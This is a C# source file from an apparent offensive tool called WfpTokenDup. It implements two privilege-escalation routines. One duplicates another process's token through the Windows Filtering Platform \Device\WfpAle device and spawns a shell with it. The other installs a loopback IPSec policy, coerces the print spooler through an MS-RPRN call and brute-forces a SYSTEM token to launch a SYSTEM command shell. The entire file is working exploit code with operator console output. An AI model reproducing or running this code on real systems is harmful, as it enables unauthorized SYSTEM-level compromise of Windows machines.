using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using RpcLibrary;
using WfpTokenDup.Interop;

namespace WfpTokenDup.Library
{
    using NTSTATUS = Int32;
    using RPC_STATUS = Int32;

    internal class Modules
    {
        public static bool GetDupicatedTokenAssignedShell(
            int pid,
            IntPtr hTokenHandle)
        {
            IntPtr hWfpAle;
            var requiredPrivileges = new List<string>
            {
                Win32Consts.SE_DEBUG_NAME,      // To get \Device\WfpAle handle
                Win32Consts.SE_IMPERSONATE_NAME // To use Secondary Logon service
            };
            var status = false;

            try
            {
                string processName = Process.GetProcessById(pid).ProcessName;
                Console.WriteLine("[*] Target information:");
                Console.WriteLine("    [*] Process Name : {0}", processName);
                Console.WriteLine("    [*] Process ID   : {0}", pid);
                Console.WriteLine("    [*] Handle Value : 0x{0}", hTokenHandle.ToString("X"));
            }
            catch
            {
                Console.WriteLine("[-] Target process is not found.");
                return false;
            }

            if (!Utilities.EnableTokenPrivileges(
                requiredPrivileges,
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                return false;
            }

            do
            {
                var hDupToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };

                Console.WriteLine("[>] Trying to get a WfpAle handle.");

                hWfpAle = Utilities.GetWfpAleHandle();

                if (hWfpAle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get WFP handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WfpAle handle (handle = 0x{0}).", hWfpAle.ToString("X"));
                }

                Console.WriteLine("[>] Trying to register the target object handle to WFP.");

                status = Utilities.WfpRegisterToken(
                    hWfpAle,
                    pid,
                    hTokenHandle,
                    out LUID modifiedId);

                if (!status)
                {
                    Console.WriteLine("[-] Target handle is not token or not found.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Token registration maybe successful.");
                    Console.WriteLine("    [*] Modified ID : 0x{0}", modifiedId.ToInt64().ToString("X16"));
                }

                /*
                 * Token registration takes time. So try to fetch token several times.
                 */
                Console.WriteLine("[>] Trying to fetch the registered token.");

                for (var trial = 0; trial < 100; trial++)
                {
                    hDupToken = Utilities.WfpGetRegisteredToken(hWfpAle, in modifiedId);

                    if (hDupToken != IntPtr.Zero)
                        break;
                }

                if (hDupToken == IntPtr.Zero)
                    Console.WriteLine("[-] The registered toke is not found. This technique is not stable, so try again.");
                else
                    Console.WriteLine("[+] Got the registered token (handle = 0x{0}).", hDupToken.ToString("X"));

                Console.WriteLine("[>] Releasing the registered token from WFP.");

                status = Utilities.WfpUnregisterToken(hWfpAle, in modifiedId);

                if (!status)
                    Console.WriteLine("[-] Failed to release the registered token.");
                else
                    Console.WriteLine("[+] The registered token is released successfully.");

                if (hDupToken == IntPtr.Zero)
                    break;

                Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");

                status = NativeMethods.CreateProcessWithToken(
                    hDupToken,
                    LOGON_FLAGS.LOGON_WITH_PROFILE,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hDupToken);

                if (status)
                {
                    Console.WriteLine("[+] Got a token assigned shell.");
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[-] Failed to get token assigned shell (Error = {0}).", Marshal.GetLastWin32Error());
                }
            } while (false);

            if (hWfpAle != IntPtr.Zero)
                NativeMethods.NtClose(hWfpAle);

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool GetSystemShell()
        {
            NTSTATUS ntstatus;
            IntPtr hWfpAle;
            var requiredPrivileges = new List<string>
            {
                Win32Consts.SE_DEBUG_NAME,      // To get \Device\WfpAle handle
                Win32Consts.SE_IMPERSONATE_NAME // To use Secondary Logon service
            };
            var hEngine = IntPtr.Zero;
            var status = false;

            if (Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] This method currently supports only 64 bit mode.");
                return false;
            }

            if (!Utilities.EnableTokenPrivileges(
                requiredPrivileges,
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                return false;
            }

            if (NativeMethods.WSAStartup(0x2020, out WSADATA _) != 0)
            {
                Console.WriteLine("[-] Failed to setup Windows socket.");
                return false;
            }

            do
            {
                var modifiedId = LUID.FromInt64(0L);
                var hSystemToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };

                Console.WriteLine("[>] Trying to get a WfpAle handle.");

                hWfpAle = Utilities.GetWfpAleHandle();

                if (hWfpAle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get WFP handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WfpAle handle (handle = 0x{0}).", hWfpAle.ToString("X"));
                }

                Console.WriteLine("[>] Trying to get WPF engine handle.");
                ntstatus = NativeMethods.FwpmEngineOpen0(
                    null,
                    RPC_C_AUTHN_TYPES.DEFAULT,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out hEngine);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to get WFP engine handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WFP engine handle (hanlde = 0x{0}).", hEngine.ToString("X"));
                }

                Console.WriteLine("[>] Installing new IPSec policy.");

                status = Utilities.InstallIPSecPolicyIPv4(
                    hEngine,
                    "PrivFuPolicy",
                    in Win32Consts.FWPM_PROVIDER_IKEEXT,
                    "127.0.0.1",
                    "127.0.0.1",
                    "psk",
                    out Guid newPolicyGuid);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to install new IPSec policy.");
                    break;
                }
                else
                {
                    Thread.Sleep(300);
                    Console.WriteLine("[+] New IPSec policy is installed (GUID: {0})", newPolicyGuid.ToString());
                }

                using (var rpc = new MsRprn())
                {
                    var printerName = @"\\127.0.0.1";
                    var devmodeContainer = new RpcLibrary.Interop.DEVMODE_CONTAINER();

                    Console.WriteLine("[>] Triggering printer.");

                    RPC_STATUS rpcStatus = rpc.RpcOpenPrinter(
                        printerName,
                        out IntPtr hPrinter,
                        null,
                        ref devmodeContainer,
                        0);

                    Console.WriteLine("[*] RPC_STATUS is 0x{0}.", rpcStatus.ToString("X8"));
                }

                /*
                 * Token registration takes time. So try to fetch token several times.
                 */
                Console.WriteLine("[>] Trying to find SYSTEM token.");

                for (var trial = 0; trial < 100; trial++)
                {
                    hSystemToken = Utilities.BruteForcingWfpToken(
                        hWfpAle,
                        "S-1-5-18",
                        out modifiedId);

                    if (hSystemToken != IntPtr.Zero)
                        break;
                }

                if (hSystemToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to find SYSTEM token. This technique is not stable, so try again.");
                }
                else
                {
                    Console.WriteLine("[+] Got a SYSTEM token (handle = 0x{0}).", hSystemToken.ToString("X"));
                    Console.WriteLine("    [*] Modified ID : 0x{0}", modifiedId.ToInt64().ToString("X16"));
                }

                Console.WriteLine("[>] Uninstalling IPSec policy.");

                ntstatus = NativeMethods.FwpmIPsecTunnelDeleteByKey0(hEngine, in newPolicyGuid);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    Console.WriteLine("[-] Failed to uninstall IPSec policy.");
                else
                    Console.WriteLine("[+] IPSec policy is uninstalled successfully.");

                if (hSystemToken == IntPtr.Zero)
                    break;

                Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");

                status = NativeMethods.CreateProcessWithToken(
                    hSystemToken,
                    LOGON_FLAGS.LOGON_WITH_PROFILE,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hSystemToken);

                if (status)
                {
                    Console.WriteLine("[+] Got a token assigned shell.");
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[-] Failed to get token assigned shell (Error = {0}).", Marshal.GetLastWin32Error());
                }
            } while (false);

            if (hEngine != IntPtr.Zero)
                NativeMethods.FwpmEngineClose0(hEngine);

            if (hWfpAle != IntPtr.Zero)
                NativeMethods.NtClose(hWfpAle);

            NativeMethods.WSACleanup();

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
